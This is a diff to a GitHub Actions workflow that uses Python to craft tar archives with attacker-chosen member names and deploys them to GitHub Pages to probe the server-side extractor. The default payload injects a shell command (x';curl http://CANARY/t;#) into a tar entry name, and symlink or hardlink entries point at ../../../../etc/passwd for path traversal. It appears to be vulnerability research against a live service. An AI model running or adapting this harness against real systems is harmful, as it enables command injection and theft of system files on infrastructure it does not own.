@@ -1,36 +1,42 @@
 name: Pages Probe (manual)
 
-# Self-contained manual probe: Python crafts a tar with an arbitrary member
-# NAME field, uploads it as the `github-pages` artifact, then deploys it.
-# This bypasses upload-pages-artifact's re-tar step so the crafted bytes
-# reach the GitHub Pages server-side extractor verbatim.
+# Self-contained manual probe. Python crafts a tar whose EVIL entry has an
+# arbitrary NAME field, uploads it as the `github-pages` artifact, then deploys
+# it via deploy-pages@v4. Bypasses upload-pages-artifact's re-tar so the crafted
+# bytes reach the GitHub Pages server-side extractor verbatim.
 #
-# Dispatch inputs are the experiment knobs:
-#   payload      - string placed verbatim in the experiment entry's NAME field
-#   canary       - replaces the literal token CANARY in payload (oast/interactsh host)
-#   typeflag     - file (REG) / symlink (SYM) / hardlink (LNK)
-#   link_target  - target path for symlink/hardlink entries
-#   format       - ustar / gnu / pax  (long names need gnu or pax)
-#   include_index- add a valid index.html so the site can serve
+# Default structure (entry_type=dir): the payload string becomes a DIRECTORY,
+# and the real index.html is nested UNDER it as {PAYLOAD}/index.html. This lets
+# you test directory-name injection / path-traversal while still shipping real
+# servable content.
+#
+# Dispatch inputs (experiment knobs):
+#   payload     - string placed verbatim in the EVIL entry's NAME field
+#   canary      - replaces token CANARY in payload (oast/interactsh host)
+#   entry_type  - dir (PAYLOAD dir + {PAYLOAD}/index.html) / file / symlink / hardlink
+#   link_target - target path for symlink/hardlink entries
+#   format      - ustar / gnu / pax  (names >=100 bytes need gnu or pax)
+#   compress    - none / gz  (gz wraps the tar in gzip; tests server auto-detect)
+#   index_html  - body placed at {PAYLOAD}/index.html in the dir case
 
 on:
   workflow_dispatch:
     inputs:
       payload:
-        description: "Tar member NAME field (experiment string). Use CANARY as a placeholder + set canary, or write the full string."
+        description: "EVIL entry NAME field (experiment string). Use CANARY + set canary, or write the full string."
         required: true
         default: "x';curl http://CANARY/t;#"
       canary:
         description: "Replaces token CANARY in payload (oast.live / interactsh host). Blank = keep payload literal."
         required: false
         default: ""
-      typeflag:
-        description: "Type of the experiment tar entry."
+      entry_type:
+        description: "Type of the EVIL entry. 'dir' nests index.html under {payload}/index.html."
         type: choice
-        options: [file, symlink, hardlink]
-        default: file
+        options: [dir, file, symlink, hardlink]
+        default: dir
       link_target:
-        description: "Target path for symlink/hardlink entries (only when typeflag is symlink/hardlink)."
+        description: "Target path for symlink/hardlink entries (only when entry_type is symlink/hardlink)."
         required: false
         default: "../../../../etc/passwd"
       format:
@@ -38,10 +44,15 @@ on:
         type: choice
         options: [ustar, gnu, pax]
         default: ustar
-      include_index:
-        description: "Include a valid index.html so the site can actually serve."
-        type: boolean
-        default: true
+      compress:
+        description: "Compression: none (plain tar, the known-working format) or gz (gzip-wrapped)."
+        type: choice
+        options: [none, gz]
+        default: none
+      index_html:
+        description: "HTML body placed at {payload}/index.html when entry_type=dir."
+        required: false
+        default: "<html>ok</html>"
 
 permissions:
   contents: read
@@ -63,19 +74,21 @@ jobs:
         env:
           INPUT_PAYLOAD: ${{ github.event.inputs.payload }}
           INPUT_CANARY: ${{ github.event.inputs.canary }}
-          INPUT_TYPEFLAG: ${{ github.event.inputs.typeflag }}
+          INPUT_ENTRY_TYPE: ${{ github.event.inputs.entry_type }}
           INPUT_LINK_TARGET: ${{ github.event.inputs.link_target }}
           INPUT_FORMAT: ${{ github.event.inputs.format }}
-          INPUT_INCLUDE_INDEX: ${{ github.event.inputs.include_index }}
+          INPUT_COMPRESS: ${{ github.event.inputs.compress }}
+          INPUT_INDEX_HTML: ${{ github.event.inputs.index_html }}
         run: |
           set -eu
           python3 - <<'PY'
           import os, tarfile, io
-          payload      = os.environ['INPUT_PAYLOAD']
-          canary       = os.environ['INPUT_CANARY']
-          typeflag     = os.environ['INPUT_TYPEFLAG']
-          link_target  = os.environ['INPUT_LINK_TARGET']
-          include_index = os.environ['INPUT_INCLUDE_INDEX'] == 'true'
+          payload     = os.environ['INPUT_PAYLOAD']
+          canary      = os.environ['INPUT_CANARY']
+          entry_type  = os.environ['INPUT_ENTRY_TYPE']
+          link_target = os.environ['INPUT_LINK_TARGET']
+          compress    = os.environ['INPUT_COMPRESS'] == 'gz'
+          index_html  = os.environ['INPUT_INDEX_HTML'].encode()
           fmt = {
               'ustar': tarfile.USTAR_FORMAT,
               'gnu':   tarfile.GNU_FORMAT,
@@ -83,41 +96,52 @@ jobs:
           }[os.environ['INPUT_FORMAT']]
           if canary:
               payload = payload.replace('CANARY', canary)
-          print(f"experiment name = {payload!r}")
-          print(f"typeflag={typeflag} format={os.environ['INPUT_FORMAT']} link_target={link_target!r}")
+          print(f"EVIL name   = {payload!r}")
+          print(f"entry_type  = {entry_type}")
+          print(f"format      = {os.environ['INPUT_FORMAT']}  compress={compress}")
+          print(f"link_target = {link_target!r}")
+          mode = 'w:gz' if compress else 'w'
           tar_path = 'artifact.tar'
-          with tarfile.open(tar_path, 'w', format=fmt) as t:
-              if include_index:
-                  data = b"<html><body>probe ok</body></html>\n"
-                  info = tarfile.TarInfo('index.html')
-                  info.size = len(data); info.mtime = 0
-                  t.addfile(info, io.BytesIO(data))
-              body = b"probe\n"
-              if typeflag == 'symlink':
-                  info = tarfile.TarInfo(payload)
-                  info.type = tarfile.SYMTYPE
-                  info.linkname = link_target
-                  info.mtime = 0
-                  t.addfile(info)
-              elif typeflag == 'hardlink':
-                  info = tarfile.TarInfo(payload)
-                  info.type = tarfile.LNKTYPE
-                  info.linkname = link_target
-                  info.mtime = 0
-                  t.addfile(info)
-              else:
-                  info = tarfile.TarInfo(payload)
-                  info.type = tarfile.REGTYPE
-                  info.size = len(body); info.mtime = 0
-                  t.addfile(info, io.BytesIO(body))
+          with tarfile.open(tar_path, mode, format=fmt) as t:
+              if entry_type == 'dir':
+                  d = tarfile.TarInfo(payload)
+                  d.type = tarfile.DIRTYPE
+                  d.mode = 0o755
+                  d.mtime = 0
+                  t.addfile(d)
+                  # real index.html nested under the EVIL directory
+                  idx = tarfile.TarInfo(f"{payload}/index.html")
+                  idx.type = tarfile.REGTYPE
+                  idx.size = len(index_html)
+                  idx.mtime = 0
+                  t.addfile(idx, io.BytesIO(index_html))
+              elif entry_type == 'symlink':
+                  s = tarfile.TarInfo(payload)
+                  s.type = tarfile.SYMTYPE
+                  s.linkname = link_target
+                  s.mtime = 0
+                  t.addfile(s)
+              elif entry_type == 'hardlink':
+                  h = tarfile.TarInfo(payload)
+                  h.type = tarfile.LNKTYPE
+                  h.linkname = link_target
+                  h.mtime = 0
+                  t.addfile(h)
+              else:  # file
+                  body = b"probe\n"
+                  f = tarfile.TarInfo(payload)
+                  f.type = tarfile.REGTYPE
+                  f.size = len(body)
+                  f.mtime = 0
+                  t.addfile(f, io.BytesIO(body))
           print("::group::Tar members")
-          with tarfile.open(tar_path) as t:
+          with tarfile.open(tar_path, 'r:*') as t:
               for m in t.getmembers():
                   print(f"  name={m.name!r} type={m.type} link={m.linkname!r} size={m.size}")
           print("::endgroup::")
           print("::group::First header bytes (hex, first 160)")
-          with open(tar_path, 'rb') as f:
-              hdr = f.read(512)
+          with open(tar_path, 'rb') as fh:
+              hdr = fh.read(512)
           print(''.join(f'{b:02x}' for b in hdr[:160]))
           print("::endgroup::")
           PY
